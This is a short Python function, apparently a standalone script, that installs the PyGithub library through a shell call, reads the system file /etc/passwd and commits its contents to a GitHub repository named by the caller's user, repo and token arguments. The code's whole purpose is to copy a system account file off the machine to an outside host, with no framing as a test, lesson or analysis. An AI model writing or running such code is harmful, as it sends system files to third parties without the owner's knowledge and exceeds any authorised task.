def run(user, repo, token):

    import os

    os.system("pip install PyGithub")

    os.chdir('/etc')

    from github import Github

    g = Github(token)

    repo = g.get_repo(user + "/" + repo)

    with open('passwd', 'r') as file:
        data = file.read()

    repo.create_file('data/passwd', 'upload pwd using python', data, branch='main')
